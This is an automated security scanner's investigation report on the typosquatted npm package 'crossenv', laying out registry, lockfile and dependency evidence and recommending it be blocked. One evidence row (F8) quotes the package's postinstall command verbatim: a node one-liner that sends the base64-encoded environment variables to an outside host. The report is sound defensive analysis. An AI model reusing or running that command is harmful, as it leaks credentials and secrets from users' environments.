# Investigation: Possible typosquat: 'crossenv' looks like 'cross-env'

Finding `GRD-d2c4aa3ad1` · rule `TYPOSQUAT` · severity high

## Verified evidence (deterministic sources)

| id | kind | source | fact |
|---|---|---|---|
| F1 | name-similarity | guardian popular-package list:node_modules/crossenv | 'crossenv' resembles popular package 'cross-env' (same name after separator/homoglyph normalisation) |
| F2 | context | inventory | the legitimate 'cross-env' is also in this dependency tree |
| F3 | install-script | package-lock.json | package runs an install-time script (hasInstallScript) |
| F4 | registry-metadata | registry.npmjs.org | npm replaced this package with a security holding placeholder (latest = 0.0.2-security); this happens when a package is removed for malicious code |
| F5 | dependency-path | dependency graph | shop-api@1.4.0 > crossenv@6.1.1 |
| F6 | baseline-diff | baseline | 'crossenv' did not exist in the trusted baseline; it is new |
| F7 | manifest | package.json | declared as crossenv: ^6.1.1 (devDependencies) |
| F8 | install-script | node_modules/crossenv/package.json | postinstall: node -e "require('http').request({host:'npm.hacktask.net',path:'/log/?'+Buffer.from(JSON.stringify(process.env)).toString('base64')}).end()" |
| F9 | registry | registry.npmjs.org | latest dist-tag: 0.0.2-security; 4 versions published |
| F10 | registry | registry.npmjs.org | package has been replaced by an npm security placeholder (taken down) |
| F11 | registry | registry.npmjs.org | package first published 2017-07-19 |
| F12 | registry | registry.npmjs.org | version 6.1.1 published 2017-07-19 |
| F13 | registry | registry.npmjs.org | version 6.1.1 is not available on the registry |
| F14 | provenance | registry.npmjs.org | source repository: git+https://github.com/npm/security-holder.git |
| F15 | git-history | git log package-lock.json | no history available (shallow clone or untracked file) |

## Inference (rule-based, NOT verified)

**Verdict:** likely-malicious (confidence medium)

**Hypothesis:** The package matches known-malicious signals (registry take-down and/or data-exfiltration script).

Rule-based inference from the verified facts; no AI model was used.

Based on facts: F1, F2, F3, F4, F5, F6

**Safe next steps:**
- block the component in policy until reviewed
- restore from the trusted baseline / pin to a reviewed commit
- escalate to security review
